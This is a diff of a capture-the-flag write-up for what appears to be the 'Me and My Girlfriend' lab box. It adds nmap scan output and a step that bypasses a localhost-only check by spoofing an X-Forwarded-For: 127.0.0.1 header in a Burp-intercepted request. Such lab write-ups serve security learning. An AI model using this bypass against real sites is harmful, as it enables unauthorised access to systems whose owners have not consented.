@@ -46,7 +46,7 @@ We also put the result from nmap in a file. This will help us to save some time 
 here is the result from runing the command above:
 ```
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 13:24 EST
-Nmap scan report for 192.168.0.30
+Nmap scan report for [ip address]
 Host is up (0.00056s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -68,8 +68,39 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.56 ms 192.168.0.30
+1   0.56 ms [ip address]
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
 ```
+
+# Action
+Fire up Burp Suit and get ready for some web application hacking! The hint was do somthing with **x-forwarded-for**
+
+according to [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For). X-Forwarded-For or XFF can be spoof and use to bypass a simple authentication. Note that the website can only be accessed local. Which mean we can only access the website only when we enter the localhost or 127.0.0.1
+
+At this point you can now guess, WE have to combine XFF and localhost.
+
+Now try to visite the website when the brup suit is on and try to intercept the get request. Then add
+```
+X-Forwarded-For: 127.0.0.1
+```
+The request should look something like this
+```
+GET /?page=index HTTP/1.1
+Host: [ip address]
+X-Forwarded-For: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=03gbe8fmpkvdr31vaf2io6co62
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+
+WOOP WOOP! we are in !!!
+<p align="center">
+<img src="/meAndMyGf1/pic/home.png">
+</p>
